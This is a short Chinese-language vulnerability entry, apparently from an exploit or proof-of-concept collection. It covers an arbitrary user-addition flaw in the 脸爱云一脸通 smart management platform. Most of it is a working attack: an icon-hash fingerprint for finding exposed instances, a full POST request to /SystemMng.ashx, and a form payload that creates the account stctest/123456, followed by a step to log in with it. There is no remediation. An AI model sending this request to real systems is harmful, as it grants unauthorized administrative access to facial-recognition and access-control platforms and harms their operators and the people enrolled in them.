# 脸爱云一脸通智慧管理平台SystemMng存在任意用户添加漏洞

- **系统**：脸爱云一脸通智慧管理平台　|　**类型**：其他　|　**CVE**：—
- **指纹**：`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
- **请求**：`POST /SystemMng.ashx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASP.NET_SessionId=whnrkuaqbz0lyv1fbwtzf23y`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 175`

**请求体 / payload**
```
operatorName=stctest&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators

使用添加的账号`stctest/123456`登录系统\
```

**其他**
- 脸爱云一脸通智慧管理平台SystemMng存在任意用户添加漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 脸爱云一脸通智慧管理平台